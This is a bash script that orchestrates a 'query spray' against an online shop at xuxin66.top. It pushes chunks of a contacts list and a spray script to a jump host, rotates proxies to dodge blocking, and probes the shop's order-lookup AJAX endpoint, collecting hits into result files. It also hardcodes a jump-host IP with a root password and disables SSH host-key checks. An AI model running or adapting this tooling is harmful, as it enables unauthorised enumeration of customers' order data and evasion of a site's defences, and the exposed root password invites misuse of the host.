#!/bin/bash
# HK orchestrator: query contacts in chunks with proxy refresh
set -u
export PATH="/data/venvs/pentest/bin:/data/automation/bin:/usr/bin:$PATH"
OUT="${1:-/data/automation/results/xuxin66.top/deep6f_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT"
JP=124.248.67.170; JP_PASS=UzHlZQDUy7XP
CONTACTS=/data/tmp/xuxin66_d6d_contacts.txt
CHUNK=25

qg(){ /data/automation/bin/qg-proxy-fetch.sh >/dev/null; sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no root@$JP "mkdir -p /data/config /data/tmp; cat > /data/config/proxy.env" < /data/config/proxy.env; }
jp(){ sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 root@$JP "$@"; }

total=$(wc -l <"$CONTACTS")
echo "OUT=$OUT contacts=$total chunk=$CHUNK"
sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no /data/automation/bin/xuxin66_query_spray.sh root@$JP:/data/tmp/
jp "chmod +x /data/tmp/xuxin66_query_spray.sh"

for start in $(seq 1 $CHUNK $total); do
  end=$((start+CHUNK-1))
  qg
  echo "[$(date +%H:%M:%S)] chunk $start-$end"
  # slice contacts
  sed -n "${start},${end}p" "$CONTACTS" > /tmp/xuxin66_chunk.txt
  sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no /tmp/xuxin66_chunk.txt root@$JP:/data/tmp/xuxin66_chunk.txt
  # warm check
  warm=$(jp 'source /data/config/proxy.env; UA="Mozilla/5.0"; BASE="https://xuxin66.top/shop"; CK=/tmp/xuxin66_d6f_ck.txt; rm -f $CK
code=$(curl -sk -x "$PROXY_URL" -c $CK -b $CK -o /tmp/w.html -w "%{http_code}" --max-time 20 -A "$UA" "$BASE/")
echo WARM=$code:$(wc -c </tmp/w.html)
r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" -e "$BASE/" -H "X-Requested-With: XMLHttpRequest" -X POST --data-urlencode "id=1" --data-urlencode "skey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" "$BASE/ajax.php?act=order")
echo SANITY=$r')
  echo "$warm"
  if ! echo "$warm" | grep -q '验证失败'; then
    echo "bad proxy, retry once"
    qg; sleep 2
    warm=$(jp 'source /data/config/proxy.env; UA="Mozilla/5.0"; BASE="https://xuxin66.top/shop"; CK=/tmp/xuxin66_d6f_ck.txt; rm -f $CK
code=$(curl -sk -x "$PROXY_URL" -c $CK -b $CK -o /tmp/w.html -w "%{http_code}" --max-time 20 -A "$UA" "$BASE/")
echo WARM=$code:$(wc -c </tmp/w.html)
r=$(curl -sk -x "$PROXY_URL" -b $CK -c $CK --max-time 8 -A "$UA" -e "$BASE/" -H "X-Requested-With: XMLHttpRequest" -X POST --data-urlencode "id=1" --data-urlencode "skey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" "$BASE/ajax.php?act=order")
echo SANITY=$r')
    echo "$warm"
    if ! echo "$warm" | grep -q '验证失败'; then
      echo "skip chunk bad proxy"; continue
    fi
  fi
  out=$(jp "bash /data/tmp/xuxin66_query_spray.sh /data/tmp/xuxin66_chunk.txt" 2>/dev/null || true)
  echo "$out" | tee -a "$OUT/query_spray.txt" | grep -E 'HTMLHIT|AJAXHIT|QUERY_DONE|SANITY|HOME' || true
  if echo "$out" | grep -qE 'HTMLHIT|AJAXHIT'; then
    echo "$out" | grep -E 'HTMLHIT|AJAXHIT|showOrder' >> "$OUT/hits.txt"
  fi
done

echo "===== QUERY PHASE DONE ====="
grep -E 'HTMLHIT|AJAXHIT' "$OUT/query_spray.txt" | tee "$OUT/hits_summary.txt" | wc -l
